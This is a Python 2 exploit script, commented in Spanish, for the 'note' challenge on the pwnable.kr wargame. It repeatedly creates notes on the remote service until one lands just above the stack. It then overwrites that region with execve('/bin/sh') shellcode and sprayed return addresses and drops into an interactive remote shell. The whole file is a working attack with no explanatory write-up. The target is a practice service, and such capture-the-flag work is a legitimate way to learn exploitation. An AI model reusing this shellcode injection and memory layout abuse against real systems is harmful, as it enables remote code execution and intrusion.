#! /usr/bin/env python2
# -*- coding: utf-8 -*-

import socket
import telnetlib
import struct
import re

# r2 -d rarun2 program=note aslr=no -a x86 -b32

"""note.rr2
#!/usr/bin/rarun2
program=./note
aslr=no
listen=9019
"""

p64 = lambda data: struct.pack("Q", data)
u64 = lambda data: struct.unpack("Q", data)[0]
p32 = lambda data: struct.pack("I", data)
u32 = lambda data: struct.unpack("I", data)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(60)
host = '0'
host = 'pwnable.kr'
s.connect((host, 9019))

stack_base = 0xffffe000
iteraciones = 1
notas = []

def recvall():
    out = ""
    while True:
        try:
            out += s.recv(1)
        except socket.timeout:
            return out

def recvline(keepends=True):
    return recvuntil('\n', keepends)

def recvlines(numlines, keepends=False):
    b = ""
    for i in xrange(numlines):
        b += recvline(keepends)
    return b

def recv(n=4096):
    b = ""
    while len(b) < n:
        b += s.recv(n - len(b))
    return b

def recvuntil(check, keepends=True):
    b = ""
    while check not in b:
        b += s.recv(1)
    if keepends is False:
        b = b[:-len(check)]
    return b

def sendline(msg):
    s.send(msg + '\n')

def send(msg):
    s.send(msg)

def interactive():
    print 'shell:'
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def calculate_stack_top():
	# lo calcula mal
	stack_top  = stack_base - 132 * 1024
	if iteraciones >= 114:
		stack_top -= int( (iteraciones - 110) // 4 ) * 4 * 1024
	return stack_top

def get_target_note():
	return calculate_stack_top() - 4096

def create_note():
	global iteraciones
	iteraciones += 1
	sendline('1')
	line = recvuntil('- Select Menu -')
	if 'memory sults are fool' in line:
		print 'Error: ' + line
		return
	rta = re.search(r'note created\. no (\d+)\s*\[(\w+)\]', line)
	num = rta.group(1)
	addr = rta.group(2)
	return num, addr

def write_note(nro, text):
	global iteraciones
	iteraciones += 1
	sendline('2')
	recvuntil('note no?\n')
	sendline(str(nro))
	line = recvline()
	if 'empty' in line or 'index out of range' in line:
		print 'Error: ' + line
		return
	sendline(text)
	recvuntil('5. exit\n')

def read_note(nro):
	global iteraciones
	iteraciones += 1
	sendline('3')
	sendline(str(nro))
	line = recvline()
	if 'empty' in line or 'index out of range' in line:
		print 'Error: ' + line
		return
	text = recvuntil('- Select Menu -')
	recvuntil('5. exit\n')
	return text.rstrip('\n- Select Menu -')

def delete_note(nro):
	global iteraciones
	iteraciones += 1
	sendline('4')
	recvuntil('note no?\n')
	sendline(str(nro))
	line = recvline()
	if 'already empty slut!' in line or 'index out of range' in line:
		print 'Error: ' + line
		return

def exit():
	global iteraciones
	iteraciones += 1
	sendline('5')

def secret_menu(text):
	global iteraciones
	iteraciones += 1
	sendline('201527')
	recvuntil('pwn this\n')
	send(text)

def test():
	num, addr = create_note()
	write_note(num, 'test!')
	a = read_note(num)
	print a
	delete_note(num)
	return

def get_note_ontop_of_stack():
	global notas
	while len(notas) != 255:
		num, addr = create_note()
		print iteraciones
		addr = int(addr, 16)
		target = get_target_note()
		if addr < 0xfffdd000 and addr > 0xf7ffe000:
			notas.append((num, addr))
			print 'aloco:{}, num: {}, iteraciones: {:d}, distancia: {}'.format(hex(addr), num, iteraciones, hex(target - addr))
			nota_max = max(notas, key=lambda n:n[1])
			if nota_max[1] >= target:
				print 'eureka!'
				return nota_max
		else:
			delete_note(num)
			print iteraciones
	print 'runned out of notes!!'
	exit()

def main():
	recvuntil('5. exit\n')
	num, addr = get_note_ontop_of_stack()
	stack_addr = addr + 4096
	print 'nota encima del stack\naddr: {}'.format(hex(addr))

	# http://shell-storm.org/shellcode/files/shellcode-575.php
	payload  = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
	payload += 'A' * 3
	payload += p32(addr) * (4096 - len(payload))
	#payload += 'B' * 596820
	#payload += p32(addr) * 4096
	write_note(num, payload)
	exit()
	interactive()
	return

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass
